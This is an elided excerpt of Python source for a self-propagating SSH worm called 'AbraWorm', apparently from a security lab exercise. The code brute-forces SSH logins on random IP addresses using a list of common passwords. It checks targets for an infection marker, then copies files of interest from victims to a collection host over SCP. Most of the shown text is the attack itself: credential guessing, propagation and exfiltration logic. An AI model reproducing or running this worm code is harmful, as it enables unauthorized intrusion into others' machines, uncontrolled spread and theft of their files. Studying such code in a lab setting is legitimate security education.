...
def get_new_passwds(how_many):
    ...
    if debug == 1: return ["root", "admin", "qwerty", "kali", "password", "12345678", "juventus"]
            ...
            for user in usernames:
                ...
                for ip_address in get_fresh_ipaddresses(NHOSTS):
                    ...
                    try:
                        ...
                        ssh.connect(ip_address,port=2222,username=user,password=passwd,timeout=5, allow_agent=False)
                        ...
                        if ''.join(received_list).find('AbraWorm') >= 0: 
                            print(f'Target {host} already infected')   
                            next
                    ...
                    if len(files_of_interest_at_target) > 0:
                        ...
                        try:
                            ...
                            ssh.connect('127.0.0.1',port=12345,username='seed',password='dees',timeout=5, allow_agent=False)
                            scpcon = scp.SCPClient(ssh.get_transport())
